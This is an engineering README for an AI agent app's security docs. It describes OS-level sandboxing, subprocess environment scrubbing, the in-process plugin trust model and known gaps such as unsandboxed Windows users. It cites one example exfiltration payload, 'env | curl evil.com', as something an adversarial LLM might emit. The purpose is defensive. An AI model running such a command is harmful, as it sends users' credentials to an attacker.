# Security — Engineering Documentation

This directory documents **how** Flowly's security boundaries are built.
For the **why** — the threat model, what counts as in-scope, the
position Flowly takes against an adversarial LLM or a malicious
plugin — read [`SECURITY.md`](../../SECURITY.md) at the repo root.

The split is deliberate: `SECURITY.md` is the public-facing trust
model, and the files here are the internal "how does the wiring
actually work" reference. A new engineer who wants to change
something security-adjacent should read both.

## Mental model in one paragraph

Flowly's agent is a single Python process that loads provider API
keys, channel bot tokens, and a gateway JWT into memory at startup.
Plugins, hooks, and skills run **in the same process** with the same
privileges — by design, not because we haven't gotten around to
isolating them. The security boundary is at the **OS level**: a
platform-native sandbox (macOS sandbox-exec, Linux bubblewrap) wraps
the entire agent process and denies it access to credentials it has
no business reading (SSH keys, cloud creds, browser storage,
Keychain). Subprocess spawns scrub Flowly-managed env vars before
exec'ing children, so an LLM-emitted `env | curl evil.com` payload
sees nothing useful. Network egress filtering is **explicitly not
provided** — it's the operator's firewall responsibility. This
posture matches what comparable upstream agent frameworks have
landed on, for the same reasons.

## What's in this directory

| Doc | Covers |
|---|---|
| [`sandbox-architecture.md`](sandbox-architecture.md) | The cross-platform `SandboxLauncher` abstraction, per-OS implementations (sandbox-exec / bwrap / Windows stub), the policy object that drives them, and where they slot into the Electron agent spawn. |
| [`cli-sandbox.md`](cli-sandbox.md) | Python entry-point self-wrap for `flowly` invocations that don't go through Electron (`uv run flowly gateway`, distro packages, etc). Mirrors the desktop's policy on the agent side. |
| [`subprocess-env-scrub.md`](subprocess-env-scrub.md) | Stripping Flowly-managed credentials from child process environments. Name-based blocklist, GHSA-grade passthrough guard, force-prefix escape hatch. |
| [`plugin-trust-model.md`](plugin-trust-model.md) | Why plugins are in-process (it's not laziness), how the marketplace UI surfaces risk per declared hook / tool, and what the trust contract actually is. |
| [`network-egress.md`](network-egress.md) | Why Flowly does **not** implement application-level egress filtering, the explicit experiment that proved it infeasible at the macOS sandbox-exec layer, and what we point operators at instead. |
| [`settings-ui.md`](settings-ui.md) | The Dashboard → Settings → Security sandbox toggle: where it lives, how `writeConfig` + `restartGateway` chain together, why there's no per-category UI. |
| [`testing.md`](testing.md) | Boundary-aligned test suite — what each test class pins, what regressions it catches, and how to run the macOS-only end-to-end sandbox-exec tests. |

## Reading order for a new engineer

If you're starting from zero:

1. [`SECURITY.md`](../../SECURITY.md) (the trust model)
2. [`README.md`](README.md) (this file — the mental model paragraph
   above)
3. [`sandbox-architecture.md`](sandbox-architecture.md) (the load-
   bearing piece; everything else slots into this)
4. The rest in any order — they each stand alone.

## Honest framing notes

The docs here aim to reflect reality, including the embarrassing
parts:

- **Windows users are not sandboxed.** `WindowsSandboxLauncher.isSupported()`
  returns `false`. Native sandboxing is on the roadmap; not shipped.
  See [`sandbox-architecture.md`](sandbox-architecture.md).

- **In-process plugins can read agent memory.** This is a property of
  the runtime, not a bug. Network egress filtering would close the
  exfil half of this attack but we don't provide it (see below). The
  sandbox closes the disk-exfil half, the env scrub closes the
  subprocess-exfil half.

- **We tried strict network mode and gave up.** Commits `e055b9e`,
  `8ac0caa`, `f22d05d` added a `config.security.strictNetwork`
  toggle plus a host allowlist derived from operator config. We
  reverted (`8d50b6e`, `344de10`, `2dd53d5`) when an end-to-end test
  showed macOS sandbox-exec doesn't support hostname-based outbound
  filtering — SBPL's `(remote ip "...")` only accepts `*` or
  `localhost`, and `(remote-host ...)` is not a valid directive. The
  schema fields and the host-derivation module are *gone* from main,
  but the lesson is captured in [`network-egress.md`](network-egress.md)
  so the next person doesn't repeat the work.

- **Per-category capability toggles existed briefly.** A short-lived
  design had `capabilities.{awsCredentials,sshKeys,homebrew,...}`
  flags so an operator could "let the agent see ~/.aws" without
  turning the whole sandbox off. We dropped it (commit `fc49561`):
  most operators don't recognise the paths, would either flip-all-on
  out of caution or skip the screen confused. A single master switch
  is the right UX shape.

- **Plugin marketplace is curated by Flowly today.** The Tier-1 risk
  UI in the marketplace card is a consent aid, not a boundary. If we
  ever open submission to anyone, additional supply-chain guards
  (commit SHA pinning, Ed25519-signed manifest whitelists) will be
  necessary — they're not built yet.

## Reference precedent

Flowly's security architecture is intentionally aligned with the
posture that mature upstream agent frameworks have converged on.
The decisions we deliberately re-use rather than reinvent:

- Plugin trust model: in-process, operator-review boundary.
- Approval gate as heuristic, not boundary.
- Network egress is the operator's firewall job.
- Env scrub design: name-based blocklist + ContextVar-scoped
  passthrough registry + GHSA-rhgp-j443-p4rf guard refusing to
  register provider credentials as passthrough.

We diverge from the typical reference posture in two places:

- **Mechanism**: comparable frameworks wrap the whole process in
  Docker or operator-managed shells (requires Docker install).
  Flowly uses platform-native primitives (sandbox-exec / bwrap)
  embedded in the desktop app — no Docker install for end users.

- **Default posture**: reference impls ship isolation as opt-in
  (operator chooses container vs. host). Flowly's sandbox is
  default-on; the Settings master switch lets operators opt out.

These are UX-driven choices appropriate to Flowly's consumer-desktop
audience vs. a developer-tool audience. The threat model is the same.
